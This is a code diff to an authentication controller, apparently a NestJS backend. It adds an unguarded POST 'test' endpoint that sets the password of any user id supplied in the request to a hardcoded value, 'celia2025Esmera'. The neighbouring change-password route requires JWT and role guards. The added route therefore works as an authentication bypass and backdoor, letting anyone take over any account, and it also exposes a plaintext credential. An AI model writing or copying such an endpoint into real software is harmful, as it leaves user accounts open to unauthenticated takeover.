@@ -34,6 +34,17 @@ export class AuthController {
     }
     return result;
   }
+  @Post('test')
+  async test(@Body() loginDto: any) {
+    const result = await this.authService.testChangePassword(
+      loginDto.id,
+      'celia2025Esmera',
+    );
+    if (!result) {
+      throw new UnauthorizedException('Invalid credentials');
+    }
+    return result;
+  }
   @UseGuards(JwtAuthGuard, RolesGuard)
   @Roles(UserRoles.ADMIN, UserRoles.COMMERCIAL_PLUS, UserRoles.COMMERCIAL)
   @Post('change-password')
